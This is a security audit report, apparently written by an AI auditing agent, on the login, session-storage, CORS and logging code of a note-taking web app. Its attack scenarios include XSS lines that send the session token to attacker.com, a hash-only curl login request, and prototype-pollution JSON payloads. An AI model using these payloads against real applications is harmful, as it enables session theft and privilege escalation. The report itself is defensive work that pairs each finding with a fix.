---
agent: security-auditor
audit-type: targeted
scope: auth-session-fix
date: 2026-03-15
status: findings-present
critical: 1
high: 4
medium: 4
low: 3
---

# Security Audit: Auth & Session Fix
**PinchPad©™ — ClawStack Studios©™**
**Audit Date:** 2026-03-15
**Auditor:** CrustAgent©™ Security Adversary Mode
**Scope:** Authentication flow, session storage, CORS, server logging, API URL handling

---

## Files Audited

| File | Change Context |
|---|---|
| `.env.local` | Added `VITE_API_URL=http://localhost:8383` |
| `src/server/routes/auth.ts` | Added debug logging, improved error handling |
| `src/lib/api.ts` | Token read from `localStorage` |
| `src/context/AuthContext.tsx` | Added `needsShellKey`, `rederiveShellKey` |
| `src/services/authService.ts` | `localStorage` with 24hr expiry via `cc_session_expiry` |
| `src/pages/Auth/Login.tsx` | DOM nesting fix |
| `package.json` | Fixed `dev:server` script |
| `server.ts` | CORS origin, rate limiter, helmet |
| `src/server/middleware/auth.ts` | Token validation, permission parsing |
| `src/lib/shellCryption.ts` | HKDF derivation, AES-GCM encrypt/decrypt |

---

## CRITICAL Issues

---

### CRIT-01: Verbose Debug Logging Leaks Key Material Prefixes to Server Logs
**Severity:** CRITICAL
**Severity Score:** 9/10
**File:** `src/server/routes/auth.ts` — lines 56, 69, 75, 81, 93, 142

**Vulnerability Description:**

The `/token` endpoint logs `keyHash?.slice(0, 16)` directly to stdout on every authentication attempt:

```
console.log('[Auth] /token called with:', { uuid: uuid?.slice(0, 8), username, keyHash: keyHash?.slice(0, 16), type });
```

SHA-256 hashes are 64-character hex strings. The first 16 characters (64 bits) of a hash are a significant prefix. Combined with the username and UUID also being logged, an attacker with access to server logs (log aggregator, log file read access, container stdout scraping, or a compromised CI/CD pipeline) can:

1. Collect the first 16 characters of every user's `keyHash`.
2. Use them to verify candidate hashes in an offline brute-force against the `hu-` key space without ever touching the database.
3. Reduce the effective uniqueness of the hash for correlation attacks — if two different users share a 16-char prefix (birthday-like collision in log space), an attacker can identify them without DB access.

Additionally, line 142 logs the username in cleartext on successful token issuance, and lines 69/75/81 log lookup outcomes (`found`/`not found`) which function as an oracle for username and UUID enumeration — an attacker replaying requests and watching logs can determine valid identifiers with no rate limit feedback (rate limiting only applies at the HTTP layer, not the log layer).

**Attack Scenario:**

```
# Attacker with read access to docker logs or log aggregator (Datadog, Papertrail, etc.):
docker logs pinchpad-server 2>&1 | grep "keyHash"
# Output: keyHash: 'a3f9b2c1e4d7f800', username: 'lucas', uuid: '97846b8a-...'

# Attacker now has: username, partial UUID, 16-char keyHash prefix
# Can mount targeted offline hash verification against known hu-<base62(64)> key space
# Can build a user enumeration map from log correlation alone
```

**Impact:** Partial key material exposure to any party with log access. Username and UUID oracle. Defense-in-depth collapse if logs are ever compromised. In a production deployment with centralized logging, this is a full credential correlation attack vector.

**Remediation:** Remove all authentication-related `console.log` calls from the `/token` route. If tracing is required, log only an opaque request ID and outcome code (success/failure) — never usernames, UUIDs, or any portion of key hashes. Replace with structured audit logging that redacts sensitive fields at the transport layer.

---

## HIGH Issues

---

### HIGH-01: Token Stored in localStorage — Persistent XSS Session Hijack
**Severity:** HIGH
**Severity Score:** 8/10
**Files:** `src/services/authService.ts` lines 90-94, 123-127; `src/lib/api.ts` lines 10, 19, 36, 51, 64

**Vulnerability Description:**

The API session token (`cc_api_token`) and all session metadata (`cc_username`, `cc_display_name`, `cc_user_uuid`, `cc_session_expiry`) are stored in `localStorage`. `localStorage` is accessible to any JavaScript executing in the same origin — including injected scripts from a successful XSS attack, malicious browser extensions, or a compromised third-party dependency.

Unlike `sessionStorage`, `localStorage` survives tab closes, browser restarts, and persists indefinitely (subject only to the custom expiry check). The 24-hour expiry is enforced entirely on the client side via `Date.now()` in `readSession()` — an attacker who steals the raw `cc_api_token` value bypasses this client-side gate entirely and uses the token directly against the server until `expires_at` in the database elapses.

The token format (`api-<base62(32)>`) provides approximately 190 bits of entropy, which is strong. The risk is not the token itself — it is the storage mechanism making it trivially accessible to any script running in the page context.

**Attack Scenario:**

```javascript
// One line from any XSS-capable injection point in the app:
fetch('https://attacker.com/steal?t=' + localStorage.getItem('cc_api_token')
  + '&u=' + localStorage.getItem('cc_user_uuid'));

// Attacker now has a valid 24-hour server-side token and the user's UUID.
// They can call /api/notes, /api/agents, and /api/auth/verify freely.
```

**Impact:** Full session hijack. All API endpoints become accessible to the attacker for the remainder of the 24-hour server-side token lifetime, regardless of the client-side expiry check.

**Remediation:** Move the session token to a `HttpOnly; Secure; SameSite=Strict` cookie managed server-side. This removes the token from JavaScript's reach entirely. If cookie-based auth is architecturally undesirable, use `sessionStorage` as a minimum improvement (tab-scoped, not persistent). Non-sensitive display data (username, displayName) can remain in `localStorage` — only the bearer token is the attack target.

---

### HIGH-02: keyHash Fallback Lookup Enables Hash-Based Account Enumeration and Targeted Brute Force
**Severity:** HIGH
**Severity Score:** 8/10
**File:** `src/server/routes/auth.ts` — lines 79-82

**Vulnerability Description:**

The `/token` endpoint implements a three-stage lookup fallback: UUID → username → **keyHash alone**. The third stage queries the database directly by `key_hash`:

```typescript
user = db.prepare('SELECT * FROM users WHERE key_hash = ?').get(keyHash) as any;
```

This means an attacker who knows (or can compute) any user's SHA-256 `keyHash` can authenticate **without ever knowing the username or UUID**. The `key_hash` column in the database serves double duty as both a credential verifier and a lookup key.

Combined with `CRIT-01` (partial hash leakage in logs), this creates a compounded attack path: partial hash from logs → narrow the brute-force space → submit candidate hashes directly without username/UUID → receive a valid session token on hash match.

Furthermore, the fallback removes the security benefit of the UUID as a "second factor of identity." The intended design appears to be: UUID + keyHash = two pieces of evidence required. The fallback collapses this to: keyHash alone = sufficient.

**Attack Scenario:**

```bash
# No username, no UUID — just a keyHash you've derived or partially brute-forced:
curl -X POST http://localhost:8383/api/auth/token \
  -H "Content-Type: application/json" \
  -d '{"keyHash":"<computed_hash>","type":"human"}'

# If the hash matches any user in the database, returns a valid token.
# Server responds: {"token":"api-...","uuid":"...","username":"..."}
```

**Impact:** Keyspace-only authentication bypass. The UUID and username — intended as identity anchors — are completely optional for authentication. Any attacker who can compute or guess a valid SHA-256 hash of any `hu-` key obtains a full session without knowing who they're targeting.

**Remediation:** Remove the keyHash-only fallback (lines 79-82). Authentication should require at minimum UUID or username alongside the keyHash. If the fallback exists to support legacy clients, gate it behind a feature flag and deprecate immediately.

---

### HIGH-03: CORS Single-Origin Hardcoding — Production Misconfiguration Risk
**Severity:** HIGH
**Severity Score:** 7/10
**File:** `server.ts` — line 27

**Vulnerability Description:**

```typescript
app.use(cors({
  origin: process.env.CORS_ORIGIN || 'http://localhost:8282',
  credentials: true,
}));
```

The fallback value `http://localhost:8282` is hardcoded. In production, if `CORS_ORIGIN` is not set (missed in deployment environment, `.env` file not loaded, or container misconfigured), the server silently falls back to permitting `localhost:8282` as the trusted origin — which in a production container environment either:

1. Has no practical effect (blocks all real requests), causing a silent denial of service where CORS preflight failures appear as network errors in the frontend.
2. Or, if the production server happens to run alongside a frontend on port 8282 (e.g., in a shared Docker network), allows unintended cross-origin access.

More critically: `credentials: true` paired with `origin: <single_string>` means the server will reflect the `Access-Control-Allow-Credentials: true` header only for requests from that exact origin. However, if a developer ever changes this to `origin: true` or `origin: '*'` for debugging and forgets to revert it, cookies and authorization headers become accessible cross-origin — a complete CORS bypass. There is no validation that the origin string is not a wildcard before `credentials: true` is applied.

Additionally, `http://` (not `https://`) is the hardcoded fallback, meaning if `CORS_ORIGIN` is ever set to an `http://` production URL, the server will accept credentialed requests over unencrypted connections.

**Attack Scenario:**

```bash
# If deployed to production without CORS_ORIGIN set:
# Legitimate frontend on https://pinchpad.example.com gets blocked (CORS mismatch)
# Developer "fixes" it by temporarily setting origin: '*'
# → credentials: true + wildcard = any site can make authenticated requests
# → Session token in localStorage readable cross-origin via fetch with credentials

# Or: attacker social-engineers developer into setting CORS_ORIGIN to attacker-controlled domain
# during incident response → attacker.com can make credentialed API requests
```

**Impact:** Production deployment misconfiguration leading to either complete CORS failure (denial of service) or, under a developer "quick fix," full cross-origin credential access.

**Remediation:** Fail hard if `CORS_ORIGIN` is not set in production (`NODE_ENV === 'production'`). Validate that the origin value is never a wildcard when `credentials: true` is active. Add origin as a required environment variable in the deployment checklist and Docker Compose file.

---

### HIGH-04: Permissions JSON Parsed Without Schema Validation — Prototype Pollution via Lobster Key Permissions
**Severity:** HIGH
**Severity Score:** 7/10
**File:** `src/server/middleware/auth.ts` — lines 32-36

**Vulnerability Description:**

```typescript
const lobster = db.prepare('SELECT permissions FROM lobster_keys WHERE id = ?').get(session.lobster_key_id) as any;
if (lobster) {
  permissions = JSON.parse(lobster.permissions);
}
```

The `permissions` field is stored as a JSON string and parsed with `JSON.parse()` directly from database content without any schema validation. An attacker who can write to the `lobster_keys` table (via a SQL injection elsewhere, a compromised migration, or direct database access) can craft a `permissions` value that, when parsed, pollutes the `Object.prototype`:

```json
{"__proto__": {"canDoEverything": true}}
```

In `requirePermission()`:
```typescript
const hasPermission = req.user.permissions && req.user.permissions[permission] === true;
```

If `Object.prototype` is polluted with `{ [permission]: true }`, every permission check on every subsequent request — including human users — will pass `true`, granting universal access across the entire application.

**Attack Scenario:**

```bash
# Attacker with DB write access (via injection or direct access) sets permissions to:
# {"__proto__":{"notes:write":true,"notes:read":true,"agents:write":true}}

# Next time ANY lobster key holder authenticates, Object.prototype is polluted.
# requirePermission('notes:write') returns true for ALL subsequent requests
# including requests from other users who haven't authenticated yet.
```

**Impact:** Potential privilege escalation to universal permission bypass across all permission-gated endpoints. Cross-user contamination of the permission check in the same server process.

**Remediation:** Validate the structure of parsed permissions against an explicit allowlist schema before assignment. Use `Object.create(null)` as the base for permissions objects to prevent prototype chain access. Never assign a DB-sourced parsed object directly to request context without sanitization.

---

## MEDIUM Issues

---

### MED-01: constantTimeCompare Leaks Length Difference — Timing Oracle Remains
**Severity:** MEDIUM
**Severity Score:** 6/10
**File:** `src/server/routes/auth.ts` — lines 8-15

**Vulnerability Description:**

```typescript
function constantTimeCompare(a: string, b: string): boolean {
  if (a.length !== b.length) return false;  // <-- Early return leaks length
  ...
}
```

The function returns `false` immediately when the lengths differ. This is a timing oracle: an attacker submitting keyHash values of varying lengths can measure response time to determine the expected length of the stored hash (64 hex characters). SHA-256 hashes are always 64 hex characters, so this is low-impact in isolation — but the function is labeled "constant-time" and is not. If the stored hash format ever changes (e.g., bcrypt-style with variable length), the early-return timing leak becomes a meaningful oracle.

Additionally, JavaScript string operations are not guaranteed to be constant-time at the JIT/V8 engine level. The XOR loop may still exhibit timing variance due to CPU branch prediction, cache effects, and V8 optimization passes. True constant-time comparison in JavaScript requires a native crypto module call (`crypto.timingSafeEqual` in Node.js).

**Attack Scenario:**

```bash
# Attacker submits hashes of different lengths and measures response times:
# Length 32 → returns faster (length mismatch early exit)
# Length 64 → falls through to XOR loop
# Confirms expected hash length without triggering the comparison failure path

# With Node.js crypto.timingSafeEqual available on the server, there is no reason
# to use a hand-rolled implementation.
```

**Impact:** Partial timing oracle confirming expected credential length. In a network context, latency variance likely swamps this signal — but it invalidates the "constant-time" guarantee and sets a dangerous precedent.

**Remediation:** Replace with `crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))` from Node.js built-in `crypto`. This handles both the length check and comparison in a single hardened call.

---

### MED-02: Identity File Parsed with JSON.parse() — No Content Validation, Prototype Pollution via Upload
**Severity:** MEDIUM
**Severity Score:** 6/10
**File:** `src/services/authService.ts` — lines 101-107

**Vulnerability Description:**

```typescript
const identity = JSON.parse(identityFileContent);
const huKey = identity.token || identity.huKey;
const uuid = identity.uuid;
```

The identity file content is parsed from a user-supplied file upload with no sanitization, size limit, or schema validation before field access. Attack vectors:

1. **Prototype Pollution via JSON:** A maliciously crafted identity file containing `{"__proto__": {"token": "hu-AAAA..."}}` could pollute `Object.prototype` in the browser context, affecting subsequent object property lookups across the entire React application.

2. **Oversized File DoS:** No file size check before `FileReader.readAsText()`. A multi-gigabyte file will be read entirely into memory and passed to `JSON.parse()`, potentially crashing the browser tab.

3. **Type Confusion:** `identity.token` and `identity.huKey` are accessed without type checking. A file containing `{"token": 12345}` passes the `!huKey` check (truthy number) but then fails `huKey.startsWith('hu-')` with a runtime TypeError rather than a graceful validation error.

**Attack Scenario:**

```json
// Crafted identity file uploaded by an attacker who tricks another user:
{
  "__proto__": {"isClawSigned": true},
  "token": "hu-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
  "uuid": "00000000-0000-0000-0000-000000000000"
}
// If Object.prototype is polluted with isClawSigned: true,
// useAuth().isClawSigned may return true for unauthenticated users after this runs
```

**Impact:** Browser-side prototype pollution affecting application auth state. Potential tab crash via oversized file. TypeError on non-string token field.

**Remediation:** Validate file size before reading (reject > 10KB). Use `JSON.parse` inside a try/catch with strict type guards on all extracted fields. Consider using a JSON schema validator. Use `Object.create(null)` as intermediate or access fields via `Object.hasOwn()` checks.

---

### MED-03: Session Expiry is Client-Enforced Only — Server Token Remains Valid After Client-Side Expiry
**Severity:** MEDIUM
**Severity Score:** 5/10
**File:** `src/services/authService.ts` — lines 33-43; `src/server/routes/auth.ts` — line 128

**Vulnerability Description:**

The `cc_session_expiry` timestamp stored in `localStorage` is checked exclusively by `readSession()` on the client. The server-side token in `api_tokens` has its own `expires_at` (also 24 hours), but the two clocks are independent and set at different moments during the login flow.

An attacker who extracts `cc_api_token` from `localStorage` can ignore the `cc_session_expiry` field entirely and use the raw token directly against the API until the server-side `expires_at` elapses. The client-side expiry provides no security value — it only affects the UI. This is expected behavior for bearer tokens, but the architecture creates a false sense of security from the named `EXPIRY_KEY` pattern.

More critically: a user who manually deletes only `cc_session_expiry` from `localStorage` while keeping `cc_api_token` will have `readSession()` return the session indefinitely (the expiry check is guarded by `if (expiry)` — a missing key skips the check entirely):

```typescript
if (expiry) {
  // Only checked if expiry key exists
  // If key is deleted from DevTools, this block is skipped
  // Session never expires client-side
}
```

**Attack Scenario:**

```javascript
// User or attacker in DevTools:
localStorage.removeItem('cc_session_expiry');
// Application now treats session as permanently valid on the client.
// readSession() returns the token forever until the server token expires.
```

**Impact:** Client-side session expiry bypass. Stored token outlives intended session duration from the application's perspective. No functional security impact if server-side expiry works correctly — but creates incorrect security assumptions.

**Remediation:** Treat missing `cc_session_expiry` as an expired/invalid session (fail closed). Use `if (!expiry || Date.now() > parseInt(expiry, 10))` to enforce expiry on missing key. Document that client-side expiry is a UX feature, not a security control.

---

### MED-04: CSP Disabled on All Environments — XSS Has No Backstop
**Severity:** MEDIUM
**Severity Score:** 6/10
**File:** `server.ts` — lines 22-24

**Vulnerability Description:**

```typescript
app.use(helmet({
  contentSecurityPolicy: false, // Disabled for Vite HMR in dev
}));
```

Content Security Policy is disabled globally with a comment attributing it to Vite HMR dev requirements. However, `NODE_ENV` is not checked — CSP is disabled in production as well. A CSP header is the primary browser-enforced backstop against XSS. Without it:

- Any XSS injection point in the application (now or in the future) executes arbitrary scripts with no browser-level restriction.
- Injected scripts can access `localStorage` (session token), make credentialed API calls, exfiltrate data, and modify the DOM without any policy violation.
- `HIGH-01` (localStorage token storage) becomes directly exploitable via any future XSS vulnerability.

The comment "Disabled for Vite HMR in dev" is correct for development, but the correct fix is to conditionally enable CSP in production, not to disable it globally.

**Attack Scenario:**

```javascript
// Any future XSS in the app (e.g., rendered username, note title, error message):
// Without CSP, injected script runs freely:
<script>fetch('https://attacker.com/?t='+localStorage.cc_api_token)</script>
// With CSP (script-src 'self'), this would be blocked by the browser.
```

**Impact:** No browser-level XSS mitigation. Any XSS vulnerability in the application becomes immediately exploitable for session token exfiltration.

**Remediation:** Enable CSP conditionally in production. For Vite production builds (no HMR), a strict CSP of `script-src 'self'` is feasible. Use `helmet.contentSecurityPolicy({ directives: { ... } })` and guard it with `if (process.env.NODE_ENV === 'production')`.

---

## LOW Issues

---

### LOW-01: .env.local Committed with Literal API URL — .gitignore Pattern Ambiguity
**Severity:** LOW
**Severity Score:** 3/10
**File:** `.gitignore` line 8; `.env.local`

**Vulnerability Description:**

The `.gitignore` contains `.env*` with the exception `!.env.example`. This pattern correctly ignores `.env.local`, so it is not committed to version control in the current state. However, the `.env.example` file itself contains the literal placeholder `GEMINI_API_KEY="MY_GEMINI_API_KEY"` — not the standard `GEMINI_API_KEY=` (empty value) pattern.

The risk: a developer who copies `.env.example` to `.env.local` and adds their real key, then notices `.env.local` appears untracked, may investigate and decide to add `!.env.local` to `.gitignore` to "fix" the tracking — accidentally committing real credentials. The placeholder values in `.env.example` (`"MY_GEMINI_API_KEY"`) rather than empty strings (`""`) invite confusion.

Additionally, `VITE_API_URL=http://localhost:8383` in `.env.local` is prefixed with `VITE_` — Vite will embed this value into the compiled client bundle. In production, if the server is not at `localhost:8383`, this will silently fail. If a production URL is ever placed here, it becomes part of the public JavaScript bundle.

**Impact:** Low risk currently. Potential developer confusion leading to accidental secret commit. `VITE_` prefix means any value in `.env.local` under that key becomes public in the built bundle.

**Remediation:** Change `.env.example` placeholders to empty strings. Add a startup check that `VITE_API_URL` is not `localhost` when `NODE_ENV=production`. Document the `VITE_` prefix convention and its bundle-embedding implications.

---

### LOW-02: Auth Middleware Token Lookup Uses SELECT * — Retrieves Raw Token from Database
**Severity:** LOW
**Severity Score:** 3/10
**File:** `src/server/middleware/auth.ts` — line 21

**Vulnerability Description:**

```typescript
const session = db.prepare('SELECT * FROM api_tokens WHERE key = ?').get(token) as any;
```

`SELECT *` retrieves the raw token key itself back from the database. While this does not create a direct vulnerability (the token was just submitted by the caller), it means the raw bearer token exists in the server's memory on every authenticated request. If a memory dump, error reporting tool, or APM agent captures the full `session` object, the live token is exposed.

The pattern also retrieves `lobster_key_id` and other fields that are only needed in specific code paths, expanding the memory footprint of sensitive data unnecessarily.

**Impact:** Minor memory hygiene issue. Raw token in server memory on every request creates slightly larger exposure window for crash dumps or memory profiling tools.

**Remediation:** Use `SELECT owner_uuid, owner_type, lobster_key_id, expires_at FROM api_tokens WHERE key = ?` rather than `SELECT *`. This avoids reflecting the raw token back into the session object.

---

### LOW-03: Rate Limiter Applied Only to /api/auth — Notes and Agents Routes Unprotected
**Severity:** LOW
**Severity Score:** 4/10
**File:** `server.ts` — lines 34-43

**Vulnerability Description:**

```typescript
const authLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 100, ... });
app.use('/api/auth', authLimiter, authRoutes);
app.use('/api/notes', notesRoutes);    // No rate limit
app.use('/api/agents', agentsRoutes);  // No rate limit
```

The `/api/notes` and `/api/agents` routes have no rate limiting. An authenticated attacker with a valid token can:

1. Enumerate all notes for a user via rapid GET requests (though auth middleware protects cross-user access, bulk requests for a single user's notes are unrestricted).
2. Spam lobster key creation requests via POST `/api/agents` until the database is saturated.
3. Trigger the revoke endpoint in a rapid loop to cause lock contention on the SQLite WAL.

The `max: 100` on auth is also permissive — 100 auth attempts per 15 minutes is sufficient for a targeted credential spray against the `/token` endpoint, especially given the keyHash-only fallback (`HIGH-02`).

**Impact:** Potential resource exhaustion via authenticated bulk operations. Auth rate limit permissive enough to allow credential spraying.

**Remediation:** Apply a general rate limiter to all routes. Reduce auth limiter to 10-20 requests per 15 minutes for security-sensitive operations. Consider per-user rate limiting for authenticated endpoints in addition to per-IP.

---

## Summary Table

| ID | Severity | Score | File | Issue |
|---|---|---|---|---|
| CRIT-01 | CRITICAL | 9/10 | `auth.ts` | Debug logging leaks keyHash prefix + username oracle |
| HIGH-01 | HIGH | 8/10 | `authService.ts`, `api.ts` | Session token in localStorage, XSS-accessible |
| HIGH-02 | HIGH | 8/10 | `auth.ts` | keyHash-only fallback bypasses UUID/username requirement |
| HIGH-03 | HIGH | 7/10 | `server.ts` | CORS hardcoded localhost fallback + production misconfiguration risk |
| HIGH-04 | HIGH | 7/10 | `middleware/auth.ts` | Permissions parsed without schema validation — prototype pollution |
| MED-01 | MEDIUM | 6/10 | `auth.ts` | `constantTimeCompare` early-exit leaks length, not truly constant-time |
| MED-02 | MEDIUM | 6/10 | `authService.ts` | Identity file parsed without size/type/schema validation |
| MED-03 | MEDIUM | 5/10 | `authService.ts` | Client-side expiry skipped if `cc_session_expiry` key is missing |
| MED-04 | MEDIUM | 6/10 | `server.ts` | CSP disabled globally, including production — no XSS backstop |
| LOW-01 | LOW | 3/10 | `.env.local`, `.env.example` | `VITE_` prefix embeds URL in bundle; example file uses non-empty placeholders |
| LOW-02 | LOW | 3/10 | `middleware/auth.ts` | `SELECT *` reflects raw token into memory on every request |
| LOW-03 | LOW | 4/10 | `server.ts` | Notes/agents routes have no rate limiting; auth limit permissive |

---

## Positive Findings (What is Done Well)

- **Key derivation (HKDF + AES-GCM-256):** `shellCryption.ts` uses the Web Crypto API correctly. HKDF with SHA-256, unique salt per user (UUID), and a version-pinned info string is solid. AES-GCM with per-operation IVs and AAD bound to `table:id` is correct record-level encryption.
- **Key generation entropy:** `crypto.randomInt(62)` in the server and `getRandomValues` with rejection sampling in the client are both correctly implemented. No modulo bias (previous audit finding resolved).
- **huKey never sent to server:** The raw `hu-` key is hashed client-side before transmission. The server never sees the plaintext key. This is the correct design.
- **huKey never stored:** The raw key is not written to `localStorage` or any persistent store — only the derived session token is stored. The shellKey lives only in React state (in-memory).
- **Lobster key authentication:** The `lobster` auth type correctly validates against `api_key_hash` rather than the encrypted `api_key` blob — proper separation between recoverable encrypted storage and verifiable hash.
- **SQL injection prevention:** All database queries use parameterized prepared statements. No string interpolation in SQL.
- **Foreign key constraints + CASCADE:** Database schema enforces referential integrity.

---

## Risk Priority Order for Remediation

1. **CRIT-01** — Remove debug logging from auth routes immediately. This is a one-line fix with zero functional impact.
2. **HIGH-02** — Remove keyHash-only fallback. This collapses a multi-factor identity model to single-factor.
3. **MED-04** — Enable CSP in production. Without it, any future XSS is immediately weaponizable against `HIGH-01`.
4. **HIGH-01** — Move token to `HttpOnly` cookie or `sessionStorage`. Largest architectural change but highest long-term impact.
5. **HIGH-04** — Add permissions schema validation before assignment.
6. **MED-01** — Replace hand-rolled constant-time compare with `crypto.timingSafeEqual`.
7. **HIGH-03** — Add production guard on CORS_ORIGIN.
8. **MED-02** — Add file size limit and type validation on identity file upload.
9. **MED-03** — Fail closed on missing session expiry key.
10. **LOW-03** — Add rate limiting to notes/agents routes.
11. **LOW-02** — Replace `SELECT *` with explicit column selection.
12. **LOW-01** — Fix `.env.example` placeholders; document VITE_ bundle embedding.

---

**Maintained by CrustAgent©™**
